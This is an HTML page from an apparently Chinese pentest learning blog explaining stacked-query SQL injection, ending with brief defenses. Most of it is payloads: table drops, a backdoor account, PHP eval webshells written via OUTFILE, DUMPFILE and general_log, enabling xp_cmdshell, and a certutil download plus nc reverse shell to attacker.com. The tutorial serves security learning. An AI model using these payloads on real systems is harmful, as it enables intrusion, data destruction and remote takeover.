@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="堆叠查询用分号分隔多条 SQL 语句，在支持多语句执行的环境中能实现增删改、写入 Webshell、甚至直接执行系统命令——一次注入完成完整攻击链。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL 注入：堆叠查询注入">
+<meta property="og:url" content="https://congliang.github.io/SQL-injection-stacked-queries/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="堆叠查询用分号分隔多条 SQL 语句，在支持多语句执行的环境中能实现增删改、写入 Webshell、甚至直接执行系统命令——一次注入完成完整攻击链。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-10-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.965Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/SQL-injection-stacked-queries/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/SQL-injection-stacked-queries/","path":"SQL-injection-stacked-queries/","title":"SQL 注入：堆叠查询注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL 注入：堆叠查询注入 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">什么是堆叠查询注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%93%AA%E4%BA%9B%E5%9C%BA%E6%99%AF%E6%94%AF%E6%8C%81%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="nav-number">2.</span> <span class="nav-text">哪些场景支持堆叠查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">3.</span> <span class="nav-text">利用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%95%B0%E6%8D%AE"><span class="nav-number">3.1.</span> <span class="nav-text">1. 增删改数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%86%99%E5%85%A5-Webshell"><span class="nav-number">3.2.</span> <span class="nav-text">2. 写入 Webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-MSSQL-%E7%9B%B4%E6%8E%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.3.</span> <span class="nav-text">3. MSSQL 直接命令执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">MSSQL 堆叠注入完整利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL-%E5%86%99-Webshell-%E7%9A%84%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-number">5.</span> <span class="nav-text">MySQL 写 Webshell 的常见问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="nav-number">6.</span> <span class="nav-text">防御方案</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SQL-injection-stacked-queries/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL 注入：堆叠查询注入 | 渗透测试实战记录">
+      <meta itemprop="description" content="堆叠查询用分号分隔多条 SQL 语句，在支持多语句执行的环境中能实现增删改、写入 Webshell、甚至直接执行系统命令——一次注入完成完整攻击链。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL 注入：堆叠查询注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-10-15T08:00:00+08:00">2024-10-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">堆叠查询用分号分隔多条 SQL 语句，在支持多语句执行的环境中能实现增删改、写入 Webshell、甚至直接执行系统命令——一次注入完成完整攻击链。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="什么是堆叠查询注入"><a href="#什么是堆叠查询注入" class="headerlink" title="什么是堆叠查询注入"></a>什么是堆叠查询注入</h2><p>堆叠查询（Stacked Queries）就是在一条 SQL 请求中执行多条语句，用分号 <code>;</code> 分隔。大多数数据库都支持多语句执行，关键看连接数据库的 API 是否允许。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 正常：一条语句</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> news <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 堆叠：两条语句</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> news <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> users; <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="哪些场景支持堆叠查询"><a href="#哪些场景支持堆叠查询" class="headerlink" title="哪些场景支持堆叠查询"></a>哪些场景支持堆叠查询</h2><table>
+<thead>
+<tr>
+<th>数据库&#x2F;API</th>
+<th>支持情况</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL + PHP <code>mysqli_multi_query()</code></td>
+<td>支持</td>
+</tr>
+<tr>
+<td>MSSQL + ASP&#x2F;ASPX</td>
+<td>默认支持</td>
+</tr>
+<tr>
+<td>PostgreSQL + PHP <code>pg_query()</code></td>
+<td>不支持多语句</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>默认不支持，需 PL&#x2F;SQL 块</td>
+</tr>
+<tr>
+<td>MySQL + Python <code>cursor.execute()</code></td>
+<td>默认不支持</td>
+</tr>
+<tr>
+<td>JDBC</td>
+<td>部分驱动支持</td>
+</tr>
+</tbody></table>
+<p>PHP 的 <code>mysql_query()</code> 不支持多语句（安全设计），但 <code>mysqli_multi_query()</code> 支持。ASP.NET + MSSQL 是堆叠注入的高发区。</p>
+<hr>
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h3 id="1-增删改数据"><a href="#1-增删改数据" class="headerlink" title="1. 增删改数据"></a>1. 增删改数据</h3><p>联合查询只能读，堆叠查询能写：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">INSERT INTO</span> users(username,password) <span class="keyword">VALUES</span>(<span class="string">&#x27;backdoor&#x27;</span>,<span class="string">&#x27;pass123&#x27;</span>) <span class="comment">-- -</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">UPDATE</span> users <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;newpass&#x27;</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="comment">-- -</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-写入-Webshell"><a href="#2-写入-Webshell" class="headerlink" title="2. 写入 Webshell"></a>2. 写入 Webshell</h3><p><strong>前提：</strong> 需要知道网站绝对路径。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span> <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>或者写入 OUTFILE 报权限错误时，试试写入 <code>/tmp/</code> 或其他可写目录。</p>
+<p><strong>MySQL INTO DUMPFILE（只写一行，适合 WebShell）：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">SELECT</span> <span class="number">0x3c3f70687020406576616c28245f504f53545b22636d64225d293b203f3e</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span> <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>十六进制编码避免引号转义。</p>
+<h3 id="3-MSSQL-直接命令执行"><a href="#3-MSSQL-直接命令执行" class="headerlink" title="3. MSSQL 直接命令执行"></a>3. MSSQL 直接命令执行</h3><p>MSSQL 的 <code>xp_cmdshell</code> 是堆叠查询的巅峰利用：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE; <span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE; <span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;whoami&#x27;</span> <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>结合 SQL Server 服务账户权限（常见 <code>NT AUTHORITY\SYSTEM</code>），直接从 SQL 注入拿到系统权限。</p>
+<pre class="mermaid">flowchart LR
+    A[堆叠注入点] --> B{数据库类型}
+    B -->|MSSQL| C[开启 xp_cmdshell]
+    C --> D[执行系统命令]
+    D --> E[反弹 Shell]
+    B -->|MySQL| F{知道绝对路径?}
+    F -->|Yes| G[INTO OUTFILE 写 Webshell]
+    F -->|No| H[读文件/修改数据]</pre>
+
+<hr>
+<h2 id="MSSQL-堆叠注入完整利用"><a href="#MSSQL-堆叠注入完整利用" class="headerlink" title="MSSQL 堆叠注入完整利用"></a>MSSQL 堆叠注入完整利用</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1. 判断当前用户权限</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>; IF IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>)<span class="operator">=</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:3&#x27;</span> <span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 开 xp_cmdshell</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>; RECONFIGURE; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>; RECONFIGURE; <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 执行命令</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;certutil -urlcache -split -f http://attacker.com/nc.exe C:\Windows\Temp\nc.exe&#x27;</span> <span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>; <span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;C:\Windows\Temp\nc.exe -e cmd.exe attacker.com 4444&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="MySQL-写-Webshell-的常见问题"><a href="#MySQL-写-Webshell-的常见问题" class="headerlink" title="MySQL 写 Webshell 的常见问题"></a>MySQL 写 Webshell 的常见问题</h2><ol>
+<li><strong>权限：</strong> MySQL 用户需要 <code>FILE</code> 权限。检测：<code>SELECT file_priv FROM mysql.user WHERE user=current_user();</code></li>
+<li><strong><code>secure_file_priv</code> 限制：</strong> MySQL 5.7+ 默认限制了 <code>INTO OUTFILE</code> 的目录。查看：<code>SELECT @@secure_file_priv;</code></li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 如果 secure_file_priv = &#x27;&#x27; → 任意目录可写</span></span><br><span class="line"><span class="comment">-- 如果 secure_file_priv = &#x27;/tmp/&#x27; → 只能写 /tmp/</span></span><br><span class="line"><span class="comment">-- 如果 secure_file_priv = NULL → 完全禁止文件操作</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>写入路径不存在：</strong> OUTFILE 不能创建目录，目标目录必须已存在。用日志写入绕过：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> <span class="keyword">ON</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> OFF;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><ol>
+<li><strong>禁止多语句执行：</strong> PHP 用 <code>mysql_query()</code> 或 PDO 默认单语句</li>
+<li><strong>最小权限：</strong> MySQL 用户不要给 FILE 权限，MSSQL 不给 sysadmin</li>
+<li><strong>secure_file_priv 设限制：</strong> 生产环境设为 NULL 或限定目录</li>
+<li><strong>禁用危险存储过程：</strong> MSSQL 禁用 xp_cmdshell</li>
+</ol>
+<hr>
+<blockquote>
+<p>本文仅用于授权安全测试与学习，请勿用于非法用途。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Linux-privesc-kernel/" rel="prev" title="Linux提权：内核漏洞利用">
+                  <i class="fa fa-angle-left"></i> Linux提权：内核漏洞利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Linux-privesc-capabilities-docker/" rel="next" title="Linux提权：Capabilities与容器逃逸">
+                  Linux提权：Capabilities与容器逃逸 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
